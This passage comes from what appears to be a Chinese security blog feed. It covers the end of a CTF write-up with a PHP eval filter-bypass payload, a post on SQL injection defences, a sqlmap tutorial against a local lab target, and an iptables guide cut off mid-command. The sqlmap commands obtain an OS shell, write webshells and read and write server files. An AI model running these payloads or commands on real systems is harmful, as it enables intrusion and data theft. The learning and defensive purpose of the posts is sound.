here&lt;/a&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'flag'</span>]) != strlen($exam)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed length'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is'</span>, $_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed keyword'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>($_GET[<span class="string">'flag'</span>]) === sha1($flag)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'What\'s going on?'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这段代码主要利用的是if条件里面的eval函数直接输出flag,前提是这里过滤十分强大，把所有可以执行的函数全部过滤，这时候只能利用开发的一个知识，就是<code>&lt;?=$flag?&gt;</code>,可以直接把flag里面的内容直接输出来，这东西我也是在学YII框架的时候学会的。<br>可以直接看一下文档里面有这样的一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= expression ?&gt; This is a shortcut for &quot;&lt;? echo expression ?&gt;&quot;</span><br></pre></td></tr></table></figure><p>这相当于说这是一个echo的缩写版<br><a href="https://imgchr.com/i/P2tbjg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P2tbjg.md.png" alt="P2tbjg.md.png"></a><br>另外呢这两句话表明了php5.4以后都存在这样的缩写形式<br>我们现在还要考虑的是如何绕过长度的问题以及不要在payload里面存在flag这个词，所以最后的payload是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=$a=&apos;blag&apos;;$a&#123;0&#125;=&apos;f&apos;;?&gt;11111111111111111;&lt;?=$$a;?&gt;</span><br></pre></td></tr></table></figure><p>这里前面的<code>?&gt;</code>的是利用了html里面的嵌套PHP的语法，同时也为了后面的<code>&lt;?=?&gt;</code>可以顺利执行，中间的<code>1</code>就是为了满足<code>strlen</code>这个函数从而执行下面的代码</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.IP地址可以用ip2long这个函数尝试去绕过<br>2.回顾了科学计数法还有这个指数形式在bypass方面的绕过<br>3.parse_url()这个函数的几个小trick，分别是对于特殊字符会替换成_,以及在///的情况下会使后面的东西忽略从而导致绕过<br>4.关于注入这东西，灵活一些，别太死板，除了一些特殊的方法绕过以外，还可以考虑字符集(这里包括16进制)<br>5.eval函数里面的执行文件操作的函数都被过滤了，可以使用缩写输出之类<br>6.正则匹配注意一下匹配\的写法应该是四个|\\|,而且对于正则的规则以^开头$结尾的，可以%0a去bypass<br>7.还有飘零大哥的思路，代码审计拿来可能是SQL注入还有逻辑漏洞这也是很骚气的，22333</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前一阵子关注点在实战上，现在又回归CTF学习套路了，这个网站&lt;a href=&quot;http://solveme.peng.kr&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://solveme.peng.kr&lt;/a&gt; 本来做了一半的题目，今天终于把他补完了，学到了炒鸡多的东西啊
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="代码审计" scheme="0verwatch.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>浅谈SQL注入防御手段</title>
    <link href="0verwatch.top/2018/08/02/sql-inject-protect/"/>
    <id>0verwatch.top/2018/08/02/sql-inject-protect/</id>
    <published>2018-08-02T15:08:29.000Z</published>
    <updated>2018-08-14T14:44:04.855Z</updated>
    
    <content type="html"><![CDATA[<h3 id="sql语句预编译"><a href="#sql语句预编译" class="headerlink" title="sql语句预编译"></a>sql语句预编译</h3><p>例如:<a id="more"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">"select id, no from user where id=?"</span>;</span><br><span class="line">      PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">      ps.setInt(<span class="number">1</span>, id);</span><br><span class="line">      ps.executeQuery();</span><br></pre></td></tr></table></figure><p>这里采用了<code>PreparedStatement</code>，就会将sql语句<code>预先编译</code>好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该sql语句的 语法结构了，因为语法分析已经完成了，而语法分析主要是分析sql命令，比如 <code>select ,from ,where ,and, or ,order by</code> 等等。所以即使你后面输入了这些sql命令，也不会被当成sql命令来执行了，因为这些sql命令的执行， 必须先的通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为sql命令来执行的，只会被当做字符串字面值参数。所以sql语句预编译可以防御sql注入</p><p>讲一下另外一个预编译，就是用PDO，这里就推荐几篇文章自己看一下，简单说一下就是原理跟上面的差不多，把执行语句和变量分开，变量分别绑定，分别传参，从而阻止了注入，只是底层不太明了，自己真菜。。<br><a href="https://segmentfault.com/q/1010000000723496" target="_blank" rel="noopener">https://segmentfault.com/q/1010000000723496</a><br><a href="http://www.cnblogs.com/zl0372/p/php_28.html" target="_blank" rel="noopener">http://www.cnblogs.com/zl0372/p/php_28.html</a><br><a href="https://blog.csdn.net/theVicTory/article/details/62884352" target="_blank" rel="noopener">https://blog.csdn.net/theVicTory/article/details/62884352</a></p><p>预编译方法就最有效！！也是如今市场上最流行的方式了</p><h3 id="检查变量数据类型和格式"><a href="#检查变量数据类型和格式" class="headerlink" title="检查变量数据类型和格式"></a>检查变量数据类型和格式</h3><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid=checkuid($uid);    <span class="comment">//检测$uid是不是数字类型,不是不继续往下运行</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid='&#123;$uid&#125;‘;</span></span><br></pre></td></tr></table></figure><p>这段语句是为了保证了id是数字类型，checkid是一个<code>自定义</code>的函数，但是千万别直接里面写一个<code>is_numeric</code>就结束了啊，这很容易就可以用16进制或者是科学计数法去绕过的，这个还是少用吧，毕竟自写函数就像是写黑名单，肯定会有纰漏的</p><h3 id="过滤特殊字符"><a href="#过滤特殊字符" class="headerlink" title="过滤特殊字符"></a>过滤特殊字符</h3><p>这个方法也相当于<code>黑名单</code>，还是少用为好，一般有纰漏就可以去绕过的了</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> boolean sql_inj(String str) </span><br><span class="line">&#123; </span><br><span class="line">String inj_str = “’|<span class="keyword">and</span>|exec|insert|select|delete|update| </span><br><span class="line">count|*|%|chr|mid|master|truncate|char|<span class="keyword">declare</span>|;|<span class="keyword">or</span>|-|+|,”; </span><br><span class="line">String inj_stra[] = split(inj_str,”|”); </span><br><span class="line"><span class="keyword">for</span> (int i=<span class="number">0</span> ; i &lt; inj_stra.length ; i++ ) </span><br><span class="line">&#123; <span class="keyword">if</span> (str.indexOf(inj_stra[i])&gt;=<span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="keyword">true</span>; &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>黑名单只能追求全面去避免SQL注入了</p><h3 id="转译特殊符号"><a href="#转译特殊符号" class="headerlink" title="转译特殊符号"></a>转译特殊符号</h3><p>例如:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid = <span class="keyword">isset</span>($_GET[<span class="string">'uid'</span>]) ? $_GET[<span class="string">'uid'</span>] : <span class="number">0</span>;</span><br><span class="line">$uid = addslashes(uid);</span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid='&#123;$uid&#125;'"</span>;</span><br></pre></td></tr></table></figure></p><p>这里就是利用了<code>addslashes</code>函数去对特殊字符进行转义，比如单引号会被转译成<code>\’</code>，所以无法闭合和注释。不能达到sql注入攻击的效果。一般在CTF题目里面如果我看到这个函数的话，我会预测有75%可能不是SQL注入，先去看看其他点是否存在漏洞</p><h3 id="从中间件配置上防止SQL注入"><a href="#从中间件配置上防止SQL注入" class="headerlink" title="从中间件配置上防止SQL注入"></a>从中间件配置上防止SQL注入</h3><p>通过启用php.ini配置文件中的<code>magic_quote_gpc (魔术字符)</code>，就可以将大部分想利用SQL注入漏洞的骇客拒绝于门外。开启<code>magic_quote_gpc=on</code>之后，能实现<code>addslshes()</code>和<code>stripslashes()</code>这两个函数的功能，这就从很大程度上防止了sql注入。<code>PHP 5.4</code> 之前 PHP 指令 <code>magic_quotes_gpc</code> 默认是 <code>on</code>， 实际上所有的 GET、POST 和 COOKIE 数据都用被 <code>addslashes()</code> 了。 不要对已经被 <code>magic_quotes_gpc</code> 转义过的字符串使用 <code>addslashes()</code>，因为这样会导致<code>双层转义</code>。 遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测<br>但是只开启<code>magic_quote_gpc</code> ，对防止sql注入是远远不够的。<br>例如以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid = <span class="keyword">isset</span>($_GET[<span class="string">'uid'</span>]) ? $_GET[<span class="string">'uid'</span>] : <span class="number">0</span>;</span><br><span class="line">$uid = addslashes(uid);</span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid=&#123;$uid&#125;"</span>;</span><br></pre></td></tr></table></figure><p>在这条sql语句中并没有单引号的保护，攻击者既不需要闭合单引号也不需要注释单引号，所以gpc开启对sql注入攻击的防范并没有作用。所以说变量还是要用引号包住才好，别直接就赋值了。。。</p><h3 id="通过安全waf去防御"><a href="#通过安全waf去防御" class="headerlink" title="通过安全waf去防御"></a>通过安全waf去防御</h3><p>过安全waf达到一定程度防御,软件层面的不多说。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>总的来说，现在很多网站多不会再使用字符串拼接去查找数据库里面的内容了，大多数现在使用的是预编译，除了那些荒废的网站以及CTF题目里面会使用，那是不是说以后挖洞挖SQL注入的就比较难了233333。。。我还是太年轻了</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;sql语句预编译&quot;&gt;&lt;a href=&quot;#sql语句预编译&quot; class=&quot;headerlink&quot; title=&quot;sql语句预编译&quot;&gt;&lt;/a&gt;sql语句预编译&lt;/h3&gt;&lt;p&gt;例如:
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Sqlmap 使用方法小结</title>
    <link href="0verwatch.top/2018/08/02/sqlmap-usage/"/>
    <id>0verwatch.top/2018/08/02/sqlmap-usage/</id>
    <published>2018-08-02T14:05:38.000Z</published>
    <updated>2018-08-02T15:22:31.416Z</updated>
    
    <content type="html"><![CDATA[<p>平常的使用GET方法像–tables –columns -T -D –dbs –dump 啥的就不说了，只是博客几天不发，空着不好，还是得写写东西<a id="more"></a></p><p>前置知识<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--is-dba 当前用户权限（是否为root权限，mssql下最高权限为sa）</span><br><span class="line">--dbs 所有数据库</span><br><span class="line">--current-db 网站当前数据库</span><br><span class="line">--users 所有数据库用户</span><br><span class="line">--current-user 当前数据库用户</span><br><span class="line">--random-agent 构造随机user-agent</span><br><span class="line">--passwords 数据库密码</span><br><span class="line">--proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒</span><br><span class="line">--threads=                       使用多少线程</span><br></pre></td></tr></table></figure></p><p><code>--is-dba</code> 这个命令有时候决定了你是否可以在服务器下进行写的操作，这个很重要，是否有写的权限，代表你是否可以在服务器上面写入一句话木马</p><h3 id="利用sqlmap进行POST注入"><a href="#利用sqlmap进行POST注入" class="headerlink" title="利用sqlmap进行POST注入"></a>利用sqlmap进行POST注入</h3><p>先利用bp去抓一个包，直接发送包里面的内容保存到一个文件里面，然后用<code>-r</code>参数去实现它就好<br>例如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql</span><br><span class="line">```    </span><br><span class="line">指定username参数，-dbms指定了某种数据库，这句话指定的是mysql数据库，-p指定的是参数，不指定的话每一个参数他都会尝试</span><br><span class="line">注意这句话已经不像平常那样需要`-u`参数了，直接`-r`参数即可，因为报文里面已经含有了含有应有的各种条件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 利用sqlmap进行需要登陆的注入</span><br><span class="line">可以跟上面进行post注入的一样，直接`-r`参数带上你的抓包文件路径，既然是需要登录的注入，那么报文里面肯定是要有`cookie`的</span><br><span class="line">我们还可以利用<span class="comment">--cookie参数注入，例如: </span></span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp; Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --current-db</span></span><br></pre></td></tr></table></figure><p>这里面的cookie参数可以抓包获得</p><h3 id="利用sqlmap进行交互式写shell"><a href="#利用sqlmap进行交互式写shell" class="headerlink" title="利用sqlmap进行交互式写shell"></a>利用sqlmap进行交互式写shell</h3><p>这个要利用sqlmap写shell的话前提需要获取网站的绝对路径，而且必须叙是root权限</p><p>使用burpsuite进行抓包，获取cookie。判断用户是否为dba，输入命令：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --is-dba</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/08/02/P0g9pT.png" alt="P0g9pT.png"></p><p>  输入命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --os-shell</span></span><br></pre></td></tr></table></figure><p>  脚本类型为PHP，所以输入4<br><img src="https://s1.ax1x.com/2018/08/02/P0gC1U.png" alt="P0gC1U.png">     </p><p>   输入第二步得到的路径，这样就可以在里面写相关命令了<br><img src="https://s1.ax1x.com/2018/08/02/P0gknJ.png" alt="P0gknJ.png"></p><p><img src="https://s1.ax1x.com/2018/08/02/P0gu9K.png" alt="P0gu9K.png"><br>这时候会在绝对路径下写入2个shell，一个用来执行命令的，另一个是用来上传的，其中上传的文件名为tmpujhum.php，这个上传的文件可以去上传小马然后连接即可，这里我们注意一下，为什么会出现admin admin这样的文字，这是sqlmap用来确认是否成功写进shell的标志，后面也会提一下。他这个写进admin的方式有可能会导致利用sqlmap写文件的时候小马文件会出现乱码。猜测是写文件的方式导致了文件的乱码，我们都知道写文件的方式要么就是ASCII要么是二进制文件流方式去实现。</p><h3 id="利用sqlmap辅助手工注入"><a href="#利用sqlmap辅助手工注入" class="headerlink" title="利用sqlmap辅助手工注入"></a>利用sqlmap辅助手工注入</h3><p>其实这个就是介绍了在发现注入点之后，怎么在sqlmap里面执行SQL语句，继续用上面的例子，改一下就是这样子的，但前提我们也是要发现数据点<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --sql-query "select user(),version(),database()"</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/08/02/P0g3Bd.png" alt="P0g3Bd.png"><br>这样就是相当于运行对应的SQL语句了。但是其实这样执行的话每一次都会对网站注入一遍，效率就比较低.<br>可以换一个方式，把<code>--sql-query</code>改为<code>--sql-shell</code>,这样一来就相当于平常我们执行SQL语句的那个cmd命令界面一样。写一条语句就直接执行一条，省去了注入的过程。</p><h3 id="利用sqlmap进行文件读写"><a href="#利用sqlmap进行文件读写" class="headerlink" title="利用sqlmap进行文件读写"></a>利用sqlmap进行文件读写</h3><p>这里可以写文件的话前提必须有<br>判断是否为<code>dba/root用户</code>，爆出了网站的绝对路径，有一个可写目录，也是用上面的案例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --file-read=/opt/lampp/htdocs/php.ini</span></span><br></pre></td></tr></table></figure><p>成功读取了<code>php.ini</code>文件，并返回了路径。</p><p><img src="https://s1.ax1x.com/2018/08/02/P0g8HA.png" alt="P0g8HA.png"><br> 打开如下图所示：<br>      这里的文件我们可以去sqlmap的output里面查看，也就是对应的用户文件夹里面</p><p>在服务器端写入文件<br>      输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --file-write C:\1.txt --file-dest /opt/lampp/htdocs/vulnerabilities/exec/1.txt</span></span><br></pre></td></tr></table></figure><p>  这里的意思就是将本地<code>C:\1.txt</code> 写入到服务器端<code>/opt/lampp/htdocs/vulnerabilities/exec/1.txt</code></p><p>打开对应文件的网站路径如下图：<br><img src="https://s1.ax1x.com/2018/08/02/P0gJAI.png" alt="P0gJAI.png">      </p><p>这里又出现了admin admin了，就是sqlmap用来确认是否写成功的标志，因为在写文件的过程中他会问是否验证，它就会以这个标志来判断啦。</p><p><img src="https://s1.ax1x.com/2018/08/02/P0gYNt.png" alt="P0gYNt.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;平常的使用GET方法像–tables –columns -T -D –dbs –dump 啥的就不说了，只是博客几天不发，空着不好，还是得写写东西
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Linux防火墙学习</title>
    <link href="0verwatch.top/2018/07/29/Linux-FW/"/>
    <id>0verwatch.top/2018/07/29/Linux-FW/</id>
    <published>2018-07-29T15:32:03.000Z</published>
    <updated>2018-08-05T11:54:35.604Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux下<code>iptables</code>的设置，设置了它就能够有效地过滤掉相关的数据包从而阻挡相关攻击，感觉这个东西跟安全有很大用处，比如在我们学习的计算机网络知识里面，网络拓扑十分瓜皮，路由器没有过滤数据包的功能，直接就实现路由转发的过程，这样就会对一个LAN造成很大的安全隐患，<a id="more"></a>现在我要更正一下自己的思路，路由器不单单实现转发功能，我现在还把他看成一台可以实现过滤功能的电脑，这样就对它所连接的LAN有保护作用了，但现在一般对于网络防火墙而言很少再使用<code>iptables</code>了，现在一般都用一些大型厂商提供的防火墙。比如华3，深信服之类的，说白了就是牛逼了一点的电脑，但是对于一台服务器而言还是可以设置规则来防止别人拿下服务器的。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>netfilter</code>    ：位于Linux内核中的包过滤功能体系，称为Linux防火墙的“内核态”<br><code>iptables</code>：位于/sbin/iptables，用来管理防火墙规则的工具，称为Linux防火墙的“用户态”</p><p>—— 上述2种称呼都可以表示Linux防火墙<br>其实用户层面使用iptables也是去调用内核里面的netfilter，这是操作系统里面的知识就不多说了</p><h3 id="Linux查看防火墙状态"><a href="#Linux查看防火墙状态" class="headerlink" title="Linux查看防火墙状态"></a>Linux查看防火墙状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service iptables start 启动防火墙</span><br><span class="line">service iptables status 查看防火墙状态，还可以使用这样一条命令iptables -L --line-numbers查看较为详细的命令</span><br><span class="line">service iptables stop 停止服务</span><br></pre></td></tr></table></figure><p>如果是阿里云的主机好像没有这个服务，他是直接在网页上让你设置防火墙，这是我自己的阿里云主机，命令行界面不能设置，但是在网页端可已自行控制端口的开放以及各种规则<br><img src="https://s1.ax1x.com/2018/07/29/Pa5y1f.png" alt="Pa5y1f.png"></p><p><a href="https://imgchr.com/i/Pa5vNR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/Pa5vNR.md.png" alt="Pa5vNR.md.png"></a></p><h3 id="包过滤的工作层次"><a href="#包过滤的工作层次" class="headerlink" title="包过滤的工作层次"></a>包过滤的工作层次</h3><p>主要实现在网络层也就是对IP数据包的处理上，详细一点就是对ip地址以及端口做处理<br><a href="https://imgchr.com/i/PaI8Ej" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/PaI8Ej.md.png" alt="PaI8Ej.md.png"></a></p><p>下面是些先行知识，关于iptables的链表结构</p><h3 id="规则链"><a href="#规则链" class="headerlink" title="规则链"></a>规则链</h3><p>规则的作用：对数据包进行过滤或处理<br>链的作用：容纳各种防火墙规则<br>链的分类依据：处理数据包的不同时机</p><p>默认包括5种规则链<br><code>INPUT</code>：处理入站数据包<br><code>OUTPUT</code>：处理出站数据包<br><code>FORWARD</code>：处理转发数据包<br><code>POSTROUTING</code>链：在进行路由选择后处理数据包<br><code>PREROUTING</code>链：在进行路由选择前处理数据包</p><p>上面这5种规则，在现实生活中一般不是全都是使用</p><h3 id="规则表"><a href="#规则表" class="headerlink" title="规则表"></a>规则表</h3><p>表的作用：容纳各种规则链<br>表的划分依据：防火墙规则的作用相似</p><p>默认包括4个规则表<br><code>raw</code>表：确定是否对该数据包进行状态跟踪<br><code>mangle</code>表：为数据包设置标记<br><code>nat</code>表：修改数据包中的源、目标IP地址或端口<br><code>filter</code>表：确定是否放行该数据包（过滤）<br>常用的就是其中<strong>filter</strong>表<strong>nat</strong>表多用于实现ip的转化功能，这里的表功能个人感觉相当于链下面的表功能，每种链都存在这四种表</p><h3 id="规则表之间的默认优先级"><a href="#规则表之间的默认优先级" class="headerlink" title="规则表之间的默认优先级"></a>规则表之间的默认优先级</h3><p><code>raw&gt;mangle&gt;nat&gt;filter</code><br>规则链之间的默认优先级<br>入站：<code>PREROUTING&gt;INPUT</code><br>出站：<code>OUTPUT&gt;POSTROUTING</code><br>转发：<code>PREROUTING&gt;FORWARD&gt;POSTROUTING</code><br>规则链内的匹配顺序<br>按顺序依次检查，匹配即停止（LOG策略例外）<br>若找不到相匹配的规则，则按该链的默认策略处理，这跟路由转发还是有点区别的<br><a href="https://imgchr.com/i/PaIBb4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/PaIBb4.md.png" alt="PaIBb4.md.png"></a></p><p>整个基本流程大概就是这样，反正吧现在的网络环境一般都是只需要其中的一部分</p><h3 id="命令实现"><a href="#命令实现" class="headerlink" title="命令实现"></a>命令实现</h3><p>基本格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables  [-t 表名]  选项  [链名]  [条件]  [-j 控制类型]</span><br></pre></td></tr></table></figure><p>几个<code>注意事项</code><br>不指定表名时，默认指filter表<br>不指定链名时，默认指表内的所有链<br>除非设置链的默认策略，否则必须指定匹配条件<br>选项、链名、控制类型使用大写字母，其余均为小写</p><p>数据包的常见控制类型<br><code>ACCEPT</code>：允许通过<br><code>DROP</code>：直接丢弃，不给出任何回应<br><code>REJECT</code>：拒绝通过，必要时会给出提示<br><code>LOG</code>：记录日志信息，然后传给下一条规则继续匹配</p><p>添加新的规则,这里考虑到他的匹配规则必要的时候需要换一下命令<br><code>-A</code>：在链的末尾追加一条规则<br><code>-I</code>：在链的开头（或指定序号）插入一条规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -A INPUT -p tcp -j ACCEPT   直接在最后加入规则</span><br><span class="line">iptables -I INPUT 2 -p icmp -j ACCEPT 这样就是在第二条后面插入规则</span><br></pre></td></tr></table></figure><p>删除、清空规则<br><code>-D</code>：删除链内指定序号（或内容）的一条规则<br><code>-F</code>：清空所有的规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> iptables -F  清空所有规则</span><br><span class="line">iptables -D INPUT 3  删除第三条规则</span><br></pre></td></tr></table></figure><p>设置默认策略<br><code>-P</code>：为指定的链设置默认规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -P FORWARD DROP  给FORWARD链默认设置DROP规则</span><br></pre></td></tr></table></figure><p>协议匹配：<code>-p</code> 协议名<br>地址匹配：<code>-s</code> 源地址、<code>-d</code> 目的地址<br>接口匹配：<code>-i</code> 入站网卡、<code>-o</code> 出站网卡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -p ! icmp -j ACCEPT  这条命令的意思就是除了icmp协议之外的所有协议都ACCEPT</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -s 10.20.30.0/24 -j DROP  这条命令的意思就是把来自10.20.30.0这一个网段的包全都丢掉，有效防止了DDOS攻击</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROP </span><br><span class="line">iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROP</span><br><span class="line">iptables -A INPUT -i eth1 -s 172.16.0.0/12 -j DROP</span><br></pre></td></tr></table></figure><p>上面这三条命令也很有实际意义，假设有人恶意串改了源地址，同时把这个包发送到内网，内网的机子会对这种包做出响应，此时源地址变成目的地址，就会直接在内网里面一个个尝试对应IP从而可以攻击内网的机子，因为这种源IP是内网地址的是不可能出现在互联网上的，理所当然应该禁止</p><p>端口匹配：<code>--sport</code>源端口、<code>--dport</code> 目的端口<br>TCP标记匹配：<code>--tcp-flags</code> 检查范围 被设置的标记<br>ICMP类型匹配：<code>--icmp-type</code> ICMP类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -s 192.168.4.0/24 -p udp --dport 53 -j ACCEPT   对于192.168.4.0这个网段的DNS服务开启做相应规则</span><br><span class="line">iptables -A INPUT -p tcp --dport 